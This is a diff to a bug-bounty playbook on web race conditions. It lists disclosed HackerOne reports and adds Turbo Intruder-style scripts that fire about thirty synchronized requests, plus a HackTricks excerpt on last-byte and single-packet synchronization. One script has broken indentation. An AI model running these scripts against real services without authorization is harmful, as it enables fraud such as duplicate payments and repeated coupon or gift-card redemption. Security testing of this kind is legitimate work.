@@ -1,7 +1,7 @@
 # Real-World Playbook — Race Conditions
 
 **Class:** `race-condition` · **Coverage-matrix tier:** 2 · **Hunter2:** /race · tools/h1_race.py · business-logic-hunter · **Skill:** race-conditions
-**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow)
+**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)
 
 ## Why it pays (real bounty signal)
 Top disclosed Race Conditions reports peak at **$5,000**. Rewarded across: Chaturbate, Cosmos, Dropbox, Figma, HackerOne, Helium, InnoGames, Internet Bug Bounty.
@@ -25,8 +25,8 @@ Top disclosed Race Conditions reports peak at **$5,000**. Rewarded across: Chatu
 - **Race condition when redeeming coupon codes** — Dropbox, $216 · 5👍 · [59179](https://hackerone.com/reports/59179)
 - **Race condition while removing the love react in community files.** — Figma, $150 · 45👍 · [996141](https://hackerone.com/reports/996141)
 - **Bypass subdomain limits using race condition** — Chaturbate, $100 · 13👍 · [395351](https://hackerone.com/reports/395351)
-- **Race Condition allows to redeem multiple times gift cards which leads to free "money"** — Reverb.com, $0 (disclosed) · 305👍 · [759247](https://hackerone.com/reports/759247)
-- **Race condition in performing retest allows duplicated payments** — HackerOne, $0 (disclosed) · 238👍 · [429026](https://hackerone.com/reports/429026)
+- **Race Condition allows to redeem multiple times gift cards which leads to free "money"** — Reverb.com, $0 (disclosed) · 307👍 · [759247](https://hackerone.com/reports/759247)
+- **Race condition in performing retest allows duplicated payments** — HackerOne, $0 (disclosed) · 239👍 · [429026](https://hackerone.com/reports/429026)
 
 ## Test flow / checklist — do these in order
 *(imported from Az0x7/vulnerability-Checklist; run each, mark result in the coverage matrix)*
@@ -86,6 +86,96 @@ add 2 headers
 add Header X-Forwaded-For:
 add Header X-Forwaded-For:198.168.43.1
 ```
+
+## Real payloads
+*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*
+
+### PayloadsAllTheThings
+```
+engine.queue(request, gate='race1')
+engine.queue(request, gate='race1')
+engine.openGate('race1')
+```
+```
+   def queueRequests(target, wordlists):
+       engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=30,
+                           requestsPerConnection=30,
+                           pipeline=False
+                           )
+
+   for i in range(30):
+       engine.queue(target.req, i)
+           engine.queue(target.req, target.baseInput, gate='race1')
+
+
+       engine.start(timeout=5)
+   engine.openGate('race1')
+
+       engine.complete(timeout=60)
+
+
+   def handleResponse(req, interesting):
+       table.add(req)
+```
+```
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=30,
+                           requestsPerConnection=100,
+                           pipeline=False
+                           )
+    request1 = '''
+POST /target-URI-1 HTTP/1.1
+Host: <REDACTED>
+Cookie: session=<REDACTED>
+
+parameterName=parameterValue
+    '''
+
+    request2 = '''
+GET /target-URI-2 HTTP/1.1
+Host: <REDACTED>
+Cookie: session=<REDACTED>
+    '''
+
+    engine.queue(request1, gate='race1')
+    for i in range(30):
+        engine.queue(request2, gate='race1')
+    engine.openGate('race1')
+    engine.complete(timeout=60)
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+## Real attacker flow / methodology
+*(how real hunters approach this class step by step)*
+
+### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
+### Race Condition
+
+
+> [!WARNING]
+> For obtaining a deep understanding of this technique check the original report in [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)<sup>[[1]](#references)</sup>
+
+#### Enhancing Race Condition Attacks
+
+The main hurdle in exploiting race conditions is ensuring that multiple requests reach the vulnerable state transition together, with **very little difference in processing time—ideally less than 1 ms**.<sup>[[15]](#references)</sup>
+
+Here you can find some techniques for Synchronizing Requests:
+
+###### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization
+
+- **HTTP/2**: Supports sending two requests over a single TCP connection, reducing network jitter impact. However, due to server-side variations, two requests may not suffice for a consistent race condition exploit.
+- **HTTP/1.1 'Last-Byte Sync'**: Enables the pre-sending of most parts of 20-30 requests, withholding a small fragment, which is then sent together, achieving simultaneous arrival at the server.
+
+**Preparation for Last-Byte Sync** involves:
+
+1. Sending headers and body data minus the final byte without ending the stream.
+2. Pausing for 100ms post-initial send.
+3. Disabling TCP_NODELAY to utilize Nagle's algorithm for batching final frames.
+
+*(truncated — open the source link for the full method)*
 
 ## Chaining — always ask "what does this unlock?"
 - Limit-overrun: redeem coupon/withdraw/transfer N× in parallel → money
